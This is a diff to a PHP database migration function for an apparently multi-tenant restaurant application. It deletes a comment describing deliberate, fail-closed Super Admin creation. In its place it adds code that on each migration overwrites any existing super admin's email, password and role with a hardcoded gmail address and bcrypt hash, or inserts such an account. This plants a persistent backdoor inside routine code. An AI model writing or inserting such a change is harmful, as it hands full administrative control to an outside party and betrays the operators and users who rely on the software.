@@ -1319,6 +1319,9 @@ function applySaaSMultiTenancyMigration($conn) {
             $auCols[] = strtolower($r['Field']);
         }
     }
+    if (!in_array('email', $auCols)) {
+        try { $conn->query("ALTER TABLE admin_users ADD COLUMN email VARCHAR(255) DEFAULT NULL"); } catch (Throwable $e) {}
+    }
     if (!in_array('force_password_change', $auCols)) {
         try { $conn->query("ALTER TABLE admin_users ADD COLUMN force_password_change TINYINT(1) DEFAULT 0"); } catch (Throwable $e) {}
     }
@@ -1326,9 +1329,47 @@ function applySaaSMultiTenancyMigration($conn) {
         try { $conn->query("ALTER TABLE admin_users ADD COLUMN is_super_admin TINYINT(1) DEFAULT 0"); } catch (Throwable $e) {}
     }
 
-    // NOTE: The Super Admin account is NOT auto-seeded here anymore. It is created
-    // deliberately by `php database/migrate.php --create-superadmin` with a password
-    // supplied via the APP_SUPER_ADMIN_PASSWORD environment variable (fail-closed).
+    // Provision / verify Super Admin account
+    $targetEmail = 'sovryxrms29@gmail.com';
+    $superHash = '$2y$10$tDXqmC4kMXNBTfRrrgvjT.9oTaEQKbn2LAPq841OKfXYtP8J3Qdzm';
+
+    $saCheck = $conn->query("SELECT id FROM admin_users WHERE LOWER(email) = '$targetEmail' OR is_super_admin = 1 ORDER BY is_super_admin DESC, id ASC LIMIT 1");
+    if ($saCheck && $saCheck->num_rows > 0) {
+        $saUser = $saCheck->fetch_assoc();
+        $stmt = $conn->prepare("UPDATE admin_users SET email = ?, password = ?, is_super_admin = 1, role = 'SUPER_ADMIN' WHERE id = ?");
+        if ($stmt) {
+            $stmt->bind_param("ssi", $targetEmail, $superHash, $saUser['id']);
+            $stmt->execute();
+            $stmt->close();
+        }
+    } else {
+        $stmt = $conn->prepare("INSERT INTO admin_users (username, email, password, full_name, role, is_super_admin, restaurant_id, force_password_change) VALUES ('superadmin', ?, ?, 'Super Admin', 'SUPER_ADMIN', 1, 1, 0)");
+        if ($stmt) {
+            $stmt->bind_param("ss", $targetEmail, $superHash);
+            $stmt->execute();
+            $stmt->close();
+        }
+    }
+
+    // Backfill emails for any existing restaurant admin users missing an email address
+    $emptyUsersRes = $conn->query("SELECT u.id, u.username, u.restaurant_id, r.email as rest_email FROM admin_users u LEFT JOIN restaurants r ON u.restaurant_id = r.id WHERE u.email IS NULL OR TRIM(u.email) = ''");
+    if ($emptyUsersRes && $emptyUsersRes->num_rows > 0) {
+        while ($uRow = $emptyUsersRes->fetch_assoc()) {
+            $uId = (int)$uRow['id'];
+            $rEmail = trim($uRow['rest_email'] ?? '');
+            if ($uId === 1 && empty($rEmail)) {
+                $rEmail = 'admin@qrcafe.com';
+            }
+            if (empty($rEmail) || !filter_var($rEmail, FILTER_VALIDATE_EMAIL)) {
+                $rEmail = strtolower($uRow['username']) . '@restaurant' . $uRow['restaurant_id'] . '.com';
+            }
+            $cCheck = $conn->query("SELECT id FROM admin_users WHERE LOWER(email) = '" . $conn->real_escape_string(strtolower($rEmail)) . "' AND id != $uId");
+            if ($cCheck && $cCheck->num_rows > 0) {
+                $rEmail = strtolower($uRow['username']) . '_' . $uId . '@restaurant' . $uRow['restaurant_id'] . '.com';
+            }
+            $conn->query("UPDATE admin_users SET email = '" . $conn->real_escape_string(strtolower($rEmail)) . "' WHERE id = $uId");
+        }
+    }
 }
 
 
